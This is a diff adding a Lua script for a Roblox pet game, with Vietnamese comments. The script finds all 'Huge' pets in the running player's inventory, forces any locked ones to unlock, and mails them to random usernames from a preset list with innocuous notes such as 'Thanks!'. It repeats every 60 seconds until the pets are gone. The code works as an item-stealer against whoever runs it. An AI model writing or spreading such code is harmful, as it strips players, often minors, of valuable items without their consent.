@@ -1,0 +1,70 @@
+local Network = require(game.ReplicatedStorage.Library.Client.Network)
+local Save = require(game.ReplicatedStorage.Library.Client.Save)
+
+-- Danh sách tên người dùng nhận pet.
+local usernames = getgenv().usernames
+local messages = {"Thanks!", "Free", "Thank you", "thanks", "thank you"}
+
+while true do
+    local HugePetList = {}
+    local inventory = Save.Get() and Save.Get().Inventory and Save.Get().Inventory.Pet
+
+    if not inventory then
+        warn("Không tìm thấy Inventory!")
+        break -- Dừng vòng lặp nếu Inventory không tồn tại
+    end
+
+    -- Tìm tất cả các pet có chứa "Huge" trong ID.
+    for PetUID, PetData in pairs(inventory) do
+        if PetData.id and string.find(PetData.id, "Huge") then
+            table.insert(HugePetList, {UID = PetUID, data = PetData})
+
+            -- Kiểm tra và mở khóa pet nếu đang bị khóa (_lk == true).
+            if PetData._lk then
+                local success = false
+                repeat
+                    success = Network.Invoke("Locking_SetLocked", PetUID, false)
+                    if not success then
+                        warn("Đang cố gắng mở khóa pet:", PetUID)
+                        task.wait()
+                    end
+                until success
+                print("Đã mở khóa pet:", PetUID)
+            end
+        end
+    end
+
+    -- Kiểm tra nếu không có pet Huge trong danh sách.
+    if #HugePetList == 0 then
+        print("Không còn pet Huge nào để gửi. Script sẽ dừng lại.")
+        break -- Thoát khỏi vòng lặp
+    end
+
+    -- Gửi từng pet trong danh sách HugePetList qua hệ thống thư.
+    for _, petInfo in ipairs(HugePetList) do
+        local username = usernames[math.random(#usernames)] -- Chọn tên ngẫu nhiên
+        local message = messages[math.random(#messages)] -- Chọn tin nhắn ngẫu nhiên
+
+        -- Tạo bảng thông tin để gửi qua hệ thống thư.
+        local args = {
+            username, -- Tên người dùng nhận pet được chọn ngẫu nhiên.
+            petInfo.data.id, -- ID của pet Huge.
+            "Pet", -- Loại của item đang gửi là Pet.
+            petInfo.UID, -- UID của pet.
+            petInfo.data._am or 1 -- Số lượng của pet, mặc định là 1.
+        }
+
+        -- Thực hiện gửi qua RemoteEvent "Mailbox: Send".
+        local success, result = pcall(function()
+            return game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+        end)
+
+        if success then
+            print("Đã gửi pet:", petInfo.data.id, "đến", username)
+        else
+            warn("Lỗi khi gửi pet:", petInfo.data.id, "-", result)
+        end
+    end
+
+    task.wait(60) -- Chờ 60 giây trước khi chạy lại vòng lặp
+end
